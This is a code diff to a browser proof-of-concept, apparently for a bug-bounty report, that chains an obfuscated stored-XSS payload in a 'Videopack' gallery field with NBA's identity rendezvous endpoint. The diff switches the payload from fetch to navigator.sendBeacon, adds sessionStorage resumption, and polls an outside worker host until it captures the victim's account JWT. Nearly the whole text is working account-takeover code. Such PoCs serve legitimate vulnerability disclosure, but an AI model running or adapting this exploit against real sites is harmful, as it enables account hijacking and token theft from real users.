@@ -39,6 +39,7 @@
 <script>
   const WORKER = "https://nba-rendezvous-ato-poc.h1-3989880-research.workers.dev";
   const CLEAN_URL = `${location.origin}${location.pathname}`;
+  const SESSION_KEY = "nba-rendezvous-ato-poc";
   const status = document.getElementById("status");
 
   function charCodeExpression(value) {
@@ -47,15 +48,9 @@
 
   function exploitPayload(code, deviceId) {
     const identityEndpoint = charCodeExpression("https://identity.nba.com/api/v1/rendezvous");
-    const returnUrl = charCodeExpression(`${CLEAN_URL}#resume=${encodeURIComponent(deviceId)}:${encodeURIComponent(code)}`);
-    const fetchName = charCodeExpression("fetch");
-    const timeoutName = charCodeExpression("setTimeout");
-    const post = charCodeExpression("POST");
-    const include = charCodeExpression("include");
-    const contentType = charCodeExpression("Content-Type");
-    const textPlain = charCodeExpression("text/plain");
-    const codeValue = charCodeExpression(code);
-    const handler = `top[${fetchName}](${identityEndpoint},{method:${post},credentials:${include},headers:{[${contentType}]:${textPlain}},body:JSON.stringify({code:${codeValue}})});top[${timeoutName}](top.location.replace.bind(top.location,${returnUrl}),1500)`;
+    const beaconName = charCodeExpression("sendBeacon");
+    const requestBody = charCodeExpression(JSON.stringify({ code }));
+    const handler = `navigator[${beaconName}](${identityEndpoint},${requestBody});top.history.back()`;
     return `250\"><details open ontoggle=${handler}>`;
   }
 
@@ -89,6 +84,7 @@
       status.textContent = "Account token captured. Full JWT displayed; use Copy full JWT.";
     }
     status.className = "ok";
+    sessionStorage.removeItem(SESSION_KEY);
     alert(jwt);
   }
 
@@ -113,6 +109,14 @@
   }
 
   async function start() {
+    const savedSession = sessionStorage.getItem(SESSION_KEY);
+    if (savedSession) {
+      const session = JSON.parse(savedSession);
+      if (!session.deviceId || !session.code) throw new Error("Saved session is invalid.");
+      await poll(session.deviceId, session.code);
+      return;
+    }
+
     const resume = location.hash.match(/^#resume=([^:]+):([A-Za-z0-9]{6})$/);
     if (resume) {
       await poll(decodeURIComponent(resume[1]), decodeURIComponent(resume[2]));
@@ -132,6 +136,7 @@
     if (!session.deviceId || !session.code) throw new Error("Worker returned an invalid session.");
 
     status.textContent = "Device code created. Triggering Videopack XSS…";
+    sessionStorage.setItem(SESSION_KEY, JSON.stringify(session));
     document.getElementById("galleryThumb").value = exploitPayload(session.code, session.deviceId);
     document.getElementById("poc").submit();
   }
@@ -139,5 +144,12 @@
   start().catch(error => {
     status.className = "error";
     status.textContent = error.message;
+  });
+
+  addEventListener("pageshow", event => {
+    if (event.persisted) start().catch(error => {
+      status.className = "error";
+      status.textContent = error.message;
+    });
   });
 </script>
